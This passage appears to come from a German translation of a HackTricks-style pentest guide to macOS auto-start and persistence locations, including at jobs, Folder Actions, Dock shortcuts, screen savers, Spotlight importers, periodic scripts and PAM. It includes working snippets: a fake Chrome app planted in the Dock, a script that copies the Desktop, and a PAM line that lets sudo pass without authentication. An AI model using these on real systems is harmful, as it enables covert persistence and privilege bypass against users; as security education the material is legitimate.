Es ist möglich, sie von der Befehlszeile aus aufzulisten, hinzuzufügen und zu entfernen:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Diese Elemente werden in der Datei **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** gespeichert.

**Anmeldeobjekte** können auch mit der API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) angegeben werden, die die Konfiguration in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** speichert.

### ZIP als Anmeldeobjekt

(Siehe vorherigen Abschnitt über Anmeldeobjekte, dies ist eine Erweiterung)

Wenn Sie eine **ZIP**-Datei als **Anmeldeobjekt** speichern, wird das **`Archive-Dienstprogramm`** es öffnen. Wenn die ZIP-Datei beispielsweise in **`~/Library`** gespeichert war und den Ordner **`LaunchAgents/file.plist`** mit einem Backdoor enthielt, wird dieser Ordner erstellt (standardmäßig nicht vorhanden) und die plist wird hinzugefügt, sodass beim nächsten Mal, wenn sich der Benutzer erneut anmeldet, der **im plist angegebene Backdoor ausgeführt wird**.

Eine weitere Option wäre, die Dateien **`.bash_profile`** und **`.zshenv`** im Benutzer-HOME zu erstellen, sodass diese Technik auch funktionieren würde, wenn der Ordner LaunchAgents bereits existiert.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* Aber Sie müssen **`at`** **ausführen** und es muss **aktiviert** sein
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* Sie müssen **`at`** **ausführen** und es muss **aktiviert** sein

#### **Beschreibung**

`at`-Aufgaben sind für die **Planung einmaliger Aufgaben** zu bestimmten Zeiten konzipiert. Im Gegensatz zu Cron-Jobs werden `at`-Aufgaben nach der Ausführung automatisch entfernt. Es ist wichtig zu beachten, dass diese Aufgaben über Systemneustarts hinweg bestehen bleiben und unter bestimmten Bedingungen als potenzielle Sicherheitsbedenken gelten.

Standardmäßig sind sie **deaktiviert**, aber der **root**-Benutzer kann **sie** mit:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Das wird in 1 Stunde eine Datei erstellen:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Überprüfen Sie die Job-Warteschlange mit `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Oben sehen wir zwei geplante Aufgaben. Wir können die Details der Aufgabe mit `at -c JOBNUMMER` ausdrucken.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Wenn AT-Aufgaben nicht aktiviert sind, werden die erstellten Aufgaben nicht ausgeführt.
{% endhint %}

Die **Jobdateien** befinden sich unter `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Der Dateiname enthält die Warteschlange, die Jobnummer und die geplante Ausführungszeit. Zum Beispiel werfen wir einen Blick auf `a0001a019bdcd2`.

* `a` - dies ist die Warteschlange
* `0001a` - Jobnummer in Hexadezimal, `0x1a = 26`
* `019bdcd2` - Zeit in Hexadezimal. Es stellt die vergangenen Minuten seit dem Epoch dar. `0x019bdcd2` entspricht `26991826` in Dezimal. Wenn wir es mit 60 multiplizieren, erhalten wir `1619509560`, was `GMT: 27. April 2021, Dienstag 7:46:00` entspricht.

Wenn wir die Jobdatei ausdrucken, stellen wir fest, dass sie dieselben Informationen enthält, die wir mit `at -c` erhalten haben.

### Ordneraktionen

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* Aber Sie müssen in der Lage sein, `osascript` mit Argumenten aufzurufen, um **`System Events`** zu kontaktieren und Ordneraktionen konfigurieren zu können
* TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
* Es hat einige grundlegende TCC-Berechtigungen wie Desktop, Dokumente und Downloads

#### Standort

* **`/Library/Scripts/Folder Action Scripts`**
* Benötigt Root-Rechte
* **Auslöser**: Zugriff auf den angegebenen Ordner
* **`~/Library/Scripts/Folder Action Scripts`**
* **Auslöser**: Zugriff auf den angegebenen Ordner

#### Beschreibung & Ausnutzung

Ordneraktionen sind Skripte, die automatisch durch Änderungen in einem Ordner ausgelöst werden, wie das Hinzufügen oder Entfernen von Elementen oder anderen Aktionen wie das Öffnen oder Ändern der Größe des Ordnerfensters. Diese Aktionen können für verschiedene Aufgaben genutzt werden und können auf verschiedene Weisen ausgelöst werden, z. B. über die Finder-Benutzeroberfläche oder Terminalbefehle.

Um Ordneraktionen einzurichten, haben Sie Optionen wie:

1. Erstellen eines Ordneraktions-Workflows mit [Automator](https://support.apple.com/guide/automator/welcome/mac) und Installation als Dienst.
2. Anhängen eines Skripts manuell über die Ordneraktions-Einrichtung im Kontextmenü eines Ordners.
3. Verwendung von OSAScript zum Senden von Apple-Ereignisnachrichten an die `System Events.app`, um programmgesteuert eine Ordneraktion einzurichten.
* Diese Methode ist besonders nützlich, um die Aktion in das System einzubetten und eine Art Persistenz zu bieten.

Das folgende Skript ist ein Beispiel dafür, was von einer Ordneraktion ausgeführt werden kann:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Um das obige Skript für Ordneraktionen nutzbar zu machen, kompilieren Sie es mit:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nachdem das Skript kompiliert wurde, richten Sie Ordneraktionen ein, indem Sie das folgende Skript ausführen. Dieses Skript aktiviert Ordneraktionen global und hängt das zuvor kompilierte Skript speziell an den Desktop-Ordner an.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Führen Sie das Einrichtungsskript mit:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* So implementieren Sie diese Persistenz über die GUI:

Dies ist das Skript, das ausgeführt wird:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Kompilieren Sie es mit: `osacompile -l JavaScript -o folder.scpt source.js`

Verschieben Sie es nach:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Dann öffnen Sie die `Folder Actions Setup`-App, wählen Sie den **Ordner, den Sie überwachen möchten**, und wählen Sie in Ihrem Fall **`folder.scpt`** (in meinem Fall habe ich es output2.scp genannt):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Wenn Sie nun diesen Ordner mit dem **Finder** öffnen, wird Ihr Skript ausgeführt.

Diese Konfiguration wurde im **plist** im Base64-Format gespeichert, das sich unter **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** befindet.

Nun versuchen wir, diese Persistenz ohne GUI-Zugriff vorzubereiten:

1. **Kopieren Sie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** nach `/tmp`, um es zu sichern:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Entfernen** Sie die gerade festgelegten Ordneraktionen:

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Jetzt, da wir eine leere Umgebung haben

3. Kopieren Sie die Sicherungsdatei: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Öffnen Sie die Folder Actions Setup.app, um diese Konfiguration zu übernehmen: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Bei mir hat das nicht funktioniert, aber das sind die Anweisungen aus dem Bericht :(
{% endhint %}

### Dock-Verknüpfungen

Bericht: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* Aber Sie müssen eine bösartige Anwendung im System installiert haben
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* `~/Library/Preferences/com.apple.dock.plist`
* **Auslöser**: Wenn der Benutzer auf die App im Dock klickt

#### Beschreibung & Ausnutzung

Alle Anwendungen, die im Dock erscheinen, sind in der plist spezifiziert: **`~/Library/Preferences/com.apple.dock.plist`**

Es ist möglich, eine Anwendung nur mit folgendem hinzuzufügen:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Durch **Social Engineering** könnten Sie sich beispielsweise als Google Chrome im Dock ausgeben und tatsächlich Ihr eigenes Skript ausführen:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Farbauswähler

Bericht: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Es muss eine sehr spezifische Aktion erfolgen
* Sie werden in einer anderen Sandbox landen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* `/Library/ColorPickers`
* Root erforderlich
* Auslöser: Verwenden des Farbauswählers
* `~/Library/ColorPickers`
* Auslöser: Verwenden des Farbauswählers

#### Beschreibung & Exploit

**Kompilieren Sie ein Farbauswahl**-Bundle mit Ihrem Code (Sie könnten beispielsweise [**dieses hier verwenden**](https://github.com/viktorstrate/color-picker-plus)) und fügen Sie einen Konstruktor hinzu (wie im [Bildschirmschoner-Abschnitt](macos-auto-start-locations.md#screen-saver)) und kopieren Sie das Bundle nach `~/Library/ColorPickers`.

Dann, wenn der Farbauswähler ausgelöst wird, sollte auch Ihr Code ausgeführt werden.

Beachten Sie, dass das Binärprogramm, das Ihre Bibliothek lädt, eine **sehr restriktive Sandbox** hat: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Nützlich zur Umgehung der Sandbox: **Nein, da Sie Ihre eigene App ausführen müssen**
* TCC-Umgehung: ???

#### Standort

* Eine spezifische App

#### Beschreibung & Exploit

Ein Anwendungsbeispiel mit einer Finder Sync-Erweiterung [**finden Sie hier**](https://github.com/D00MFist/InSync).

Anwendungen können `Finder Sync-Erweiterungen` haben. Diese Erweiterung wird in eine Anwendung eingefügt, die ausgeführt wird. Darüber hinaus muss die Erweiterung, um ihren Code ausführen zu können, **mit einem gültigen Apple-Entwicklerzertifikat signiert sein**, sie muss **gesandboxt sein** (obwohl entspannte Ausnahmen hinzugefügt werden könnten) und sie muss mit etwas wie registriert sein:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Bildschirmschoner

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie werden in einer gängigen Anwendungs-Sandbox landen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* `/System/Library/Screen Savers`
* Root erforderlich
* **Auslöser**: Wählen Sie den Bildschirmschoner aus
* `/Library/Screen Savers`
* Root erforderlich
* **Auslöser**: Wählen Sie den Bildschirmschoner aus
* `~/Library/Screen Savers`
* **Auslöser**: Wählen Sie den Bildschirmschoner aus

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beschreibung & Exploit

Erstellen Sie ein neues Projekt in Xcode und wählen Sie die Vorlage, um einen neuen **Bildschirmschoner** zu generieren. Fügen Sie dann Ihren Code hinzu, zum Beispiel den folgenden Code zum Generieren von Protokollen.

**Bauen** Sie es und kopieren Sie das `.saver`-Bundle nach **`~/Library/Screen Savers`**. Öffnen Sie dann die Bildschirmschoner-GUI und wenn Sie darauf klicken, sollte es viele Protokolle generieren:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Beachten Sie, dass Sie aufgrund der Berechtigungen der Binärdatei, die diesen Code lädt (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), **`com.apple.security.app-sandbox`** finden können, dass Sie **innerhalb des üblichen Anwendungssandkastens** sind.
{% endhint %}

Saver-Code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight-Plugins

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber du wirst in einer Anwendungs-Sandbox enden
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
* Die Sandbox scheint sehr begrenzt zu sein

#### Standort

* `~/Library/Spotlight/`
* **Auslöser**: Eine neue Datei mit einer Erweiterung, die vom Spotlight-Plugin verwaltet wird, wird erstellt.
* `/Library/Spotlight/`
* **Auslöser**: Eine neue Datei mit einer Erweiterung, die vom Spotlight-Plugin verwaltet wird, wird erstellt.
* Root erforderlich
* `/System/Library/Spotlight/`
* **Auslöser**: Eine neue Datei mit einer Erweiterung, die vom Spotlight-Plugin verwaltet wird, wird erstellt.
* Root erforderlich
* `Some.app/Contents/Library/Spotlight/`
* **Auslöser**: Eine neue Datei mit einer Erweiterung, die vom Spotlight-Plugin verwaltet wird, wird erstellt.
* Neue App erforderlich

#### Beschreibung & Ausnutzung

Spotlight ist die integrierte Suchfunktion von macOS, die Benutzern einen **schnellen und umfassenden Zugriff auf Daten auf ihren Computern** bietet.\
Um diese schnelle Suchfunktion zu ermöglichen, pflegt Spotlight eine **eigene Datenbank** und erstellt einen Index, indem es die meisten Dateien analysiert, was schnelle Suchen sowohl nach Dateinamen als auch nach deren Inhalten ermöglicht.

Der zugrunde liegende Mechanismus von Spotlight umfasst einen zentralen Prozess namens 'mds', was für **'Metadatenserver'** steht. Dieser Prozess orchestriert den gesamten Spotlight-Dienst. Ergänzend dazu gibt es mehrere 'mdworker'-Daemons, die verschiedene Wartungsaufgaben ausführen, wie das Indizieren verschiedener Dateitypen (`ps -ef | grep mdworker`). Diese Aufgaben werden durch Spotlight-Importer-Plugins oder **".mdimporter-Bundles**" ermöglicht, die Spotlight das Verstehen und Indizieren von Inhalten über eine Vielzahl von Dateiformaten hinweg ermöglichen.

Die Plugins oder **`.mdimporter`**-Bundles befinden sich an den zuvor genannten Orten, und wenn ein neues Bundle erscheint, wird es innerhalb von Minuten geladen (kein Neustart eines Dienstes erforderlich). Diese Bundles müssen angeben, welche **Dateitypen und Erweiterungen sie verwalten können**, auf diese Weise wird Spotlight sie verwenden, wenn eine neue Datei mit der angegebenen Erweiterung erstellt wird.

Es ist möglich, **alle geladenen `mdimporters`** zu finden, indem man ausführt:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Und zum Beispiel wird **/Library/Spotlight/iBooksAuthor.mdimporter** verwendet, um diese Art von Dateien zu analysieren (Erweiterungen `.iba` und `.book` unter anderem):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Wenn Sie die Plist anderer `mdimporter` überprüfen, finden Sie möglicherweise nicht den Eintrag **`UTTypeConformsTo`**. Das liegt daran, dass es sich um einen integrierten _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) handelt und keine Erweiterungen angegeben werden müssen.

Darüber hinaus haben Systemstandard-Plugins immer Vorrang, sodass ein Angreifer nur auf Dateien zugreifen kann, die nicht anderweitig von Apples eigenen `mdimporters` indiziert sind.
{% endhint %}

Um Ihren eigenen Importeur zu erstellen, könnten Sie mit diesem Projekt beginnen: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) und dann den Namen ändern, die **`CFBundleDocumentTypes`** ändern und **`UTImportedTypeDeclarations`** hinzufügen, damit er die Erweiterung unterstützt, die Sie unterstützen möchten, und diese in **`schema.xml`** reflektieren.\
Ändern Sie dann den Code der Funktion **`GetMetadataForFile`**, um Ihr Payload auszuführen, wenn eine Datei mit der verarbeiteten Erweiterung erstellt wird.

Schließlich **bauen und kopieren Sie Ihren neuen `.mdimporter`** an einen der vorherigen Orte und Sie können überprüfen, ob er geladen wird, indem Sie die **Logs überwachen** oder **`mdimport -L`** überprüfen.

### ~~Einstellungsfenster~~

{% hint style="danger" %}
Es scheint, dass dies nicht mehr funktioniert.
{% endhint %}

Bericht: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Nützlich zur Umgehung der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Es erfordert eine spezifische Benutzeraktion
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Beschreibung

Es scheint, dass dies nicht mehr funktioniert.

## Root-Sandbox-Umgehung

{% hint style="success" %}
Hier finden Sie Startorte, die für die **Sandbox-Umgehung** nützlich sind und es Ihnen ermöglichen, einfach etwas auszuführen, indem Sie es als **root** in eine Datei schreiben und/oder andere **seltsame Bedingungen** erfordern.
{% endhint %}

### Periodisch

Bericht: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Nützlich zur Umgehung der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen root sein
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Root erforderlich
* **Auslöser**: Wenn die Zeit gekommen ist
* `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local`
* Root erforderlich
* **Auslöser**: Wenn die Zeit gekommen ist

#### Beschreibung & Ausnutzung

Die periodischen Skripte (**`/etc/periodic`**) werden aufgrund der in `/System/Library/LaunchDaemons/com.apple.periodic*` konfigurierten **Startdaemons** ausgeführt. Beachten Sie, dass Skripte, die in `/etc/periodic/` gespeichert sind, als **Besitzer der Datei** ausgeführt werden, sodass dies nicht für einen potenziellen Privilegierungswechsel funktioniert.
{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Es gibt andere periodische Skripte, die in **`/etc/defaults/periodic.conf`** ausgeführt werden.
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Wenn es Ihnen gelingt, eine der Dateien `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local` zu schreiben, wird sie **früher oder später ausgeführt**.

{% hint style="warning" %}
Beachten Sie, dass das periodische Skript als Besitzer des Skripts **ausgeführt wird**. Wenn ein regulärer Benutzer das Skript besitzt, wird es als dieser Benutzer ausgeführt (dies kann Angriffe zur Privilegieneskalation verhindern).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Nützlich zur Umgehung der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen root sein
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* Root immer erforderlich

#### Beschreibung & Ausnutzung

Da PAM mehr auf **Persistenz** und Malware als auf einfache Ausführung in macOS ausgerichtet ist, wird in diesem Blog keine ausführliche Erklärung gegeben. **Lesen Sie die Writeups, um diese Technik besser zu verstehen**.

Überprüfen Sie PAM-Module mit:
```bash
ls -l /etc/pam.d
```
Eine Persistenz-/Privileg Eskalationstechnik, die PAM ausnutzt, ist so einfach wie die Modifizierung des Moduls /etc/pam.d/sudo durch das Hinzufügen der Zeile am Anfang:
```bash
auth       sufficient     pam_permit.so
```
So wird es **etwa so aussehen**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Und daher wird jeder Versuch, **`sudo` zu verwenden, funktionieren**.

{% hint style="danger" %}
Beachten Sie, dass dieses Verzeichnis durch TCC geschützt ist, daher ist es sehr wahrscheinlich, dass der Benutzer aufgefordert wird, um Zugriff zu bitten.
{% endhint %}

### Autorisierungs-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
